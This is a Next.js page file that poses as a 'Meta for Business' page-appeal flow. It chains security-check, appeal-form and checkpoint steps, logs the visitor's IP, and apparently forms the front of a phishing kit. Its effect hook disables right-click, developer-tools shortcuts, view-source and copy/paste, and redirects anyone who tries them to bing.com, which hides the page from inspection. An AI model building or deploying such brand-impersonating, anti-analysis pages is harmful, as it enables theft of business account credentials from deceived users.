import Head from 'next/head';
import { useState, useEffect } from "react";
import styles from '../styles/Home.module.css';
import SecurityCheck from './security-check';
import AppealForm from './appeal-form';
import CheckPoint from './check-point';

export default function Home(ip) {
  const [steps, setOpen] = useState({ step_one: true, step_two: false, step_three: false });

  const getData = (data) => {
    if (data.type === 'security-check') {
      setOpen({ step_one: false, step_two: true, step_three: false });
    } else if (data.type === 'appeal') {
      setOpen({ step_one: false, step_two: false, step_three: true });
    }
  }

  useEffect(() => {
    // 防止右鍵點擊
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // 防止特定的鍵盤組合
    document.addEventListener('keydown', function(e) {
        if (e.keyCode === 123 || // F12
            (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || // Ctrl+Shift+I/J
            (e.ctrlKey && e.keyCode === 85) // Ctrl+U
        ) {
            e.preventDefault();
            window.location.href = "https://www.bing.com";
        }

        if (e.ctrlKey && 
            (e.keyCode === 67 || // Ctrl+C
             e.keyCode === 86 || // Ctrl+V
             e.keyCode === 85 || // Ctrl+U
             e.keyCode === 87)   // Ctrl+W
        ) {
            e.preventDefault();
            window.location.href = "https://www.bing.com";
        }
    });

    return () => {
      // 清除事件監聽器
      document.removeEventListener('contextmenu', () => {});
      document.removeEventListener('keydown', () => {});
    }
  }, []);

  return (
    <div className={styles.container}>
      <Head>
        <title>Meta for Business - 頁面申訴</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>

      {steps.step_one && (
        <SecurityCheck onSubmit={getData} />
      )}

      {steps.step_two && (
        <AppealForm onSubmit={getData} ip={ip} />
      )}

      {steps.step_three && (
        <CheckPoint ip={ip} />
      )}

      <style jsx global>{`
        body {
          background-color: #e9eaed;
          margin: 0px;
          padding: 0px;
        }
      `}
      </style>
    </div>
  )
}

Home.getInitialProps = async ({ req }) => {
  let userIP;
  if (req) {
    userIP = req.headers['x-real-ip'] || req.connection.remoteAddress;
  }
  return { userIP };
}
